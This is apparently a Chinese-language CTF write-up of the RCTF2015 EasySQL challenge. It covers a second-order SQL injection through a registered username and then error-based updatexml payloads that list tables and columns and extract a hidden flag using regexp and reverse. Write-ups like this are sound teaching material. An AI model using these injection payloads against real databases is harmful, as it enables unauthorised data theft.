---
title: '[RCTF2015]EasySQL'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-08-14 20:58:25
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1095473.png
---
这次真长记性了，看到修改密码的我tm直接二次注入。
注册用户名为1"的账号，修改密码时报错：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/dbdzbzdb.jpg)

猜测后台sql语句:

update users set password='xxxx' where username="xxxx" and pwd='c4ca4238a0b923820dcc509a6f75849b'
因为存在报错回显，那么就可以直接用报错注入

test"^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#

test"^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))),1)#

test"^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag))),1)#

但是是个假flag，真flag在user表
可以用regexp正则来匹配
regexp('^r')是MySql的正则，^r匹配开头是r的字段，也就是column_name=real_flag_1s_her

test"^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1)#

正序逆序输出完整flag：

test"^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1)#

test"^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1)#


